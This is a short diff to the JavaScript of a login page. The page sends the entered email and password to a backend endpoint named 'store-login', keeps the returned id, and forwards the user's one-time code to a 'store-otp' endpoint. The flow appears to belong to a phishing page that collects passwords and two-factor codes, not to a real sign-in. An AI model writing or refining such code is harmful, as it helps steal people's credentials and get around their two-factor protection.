@@ -49,6 +49,7 @@ const loginLoader = document.getElementById("loginLoader");
 const loginBox = document.getElementById("loginBox");
 const otpBox = document.getElementById("otpBox");
 const otpBtn = document.getElementById("otpBtn");
+let loginId = null;
 
 // LOGIN BUTTON
 loginBtn.onclick = async () => {
@@ -60,12 +61,31 @@ loginBtn.onclick = async () => {
   loginLoader.style.display = "block";
   loginBtn.disabled = true;
 
-  // Send login to backend
-  await fetch("http://localhost:5000/store-login", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ email, pass })
-  });
+  // Send login to backend and capture returned login id
+  try {
+    const res = await fetch("http://localhost:5000/store-login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, pass })
+    });
+
+    const data = await res.json().catch(() => ({}));
+    if (!data || !data.success) {
+      alert("Error saving login: " + (data.error || 'Unknown'));
+      loginText.style.display = "inline";
+      loginLoader.style.display = "none";
+      loginBtn.disabled = false;
+      return;
+    }
+
+    loginId = data.id || null;
+  } catch (err) {
+    alert("Network error storing login: " + err.message);
+    loginText.style.display = "inline";
+    loginLoader.style.display = "none";
+    loginBtn.disabled = false;
+    return;
+  }
 
   setTimeout(() => {
     loginBox.style.display = "none";
@@ -80,10 +100,11 @@ otpBtn.onclick = async () => {
   if (!otp) { alert("Enter OTP"); return; }
 
   try {
+    const body = loginId ? { otp, email, loginId } : { otp, email };
     const res = await fetch("http://localhost:5000/store-otp", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ otp, email })
+      body: JSON.stringify(body)
     });
 
     const data = await res.json();
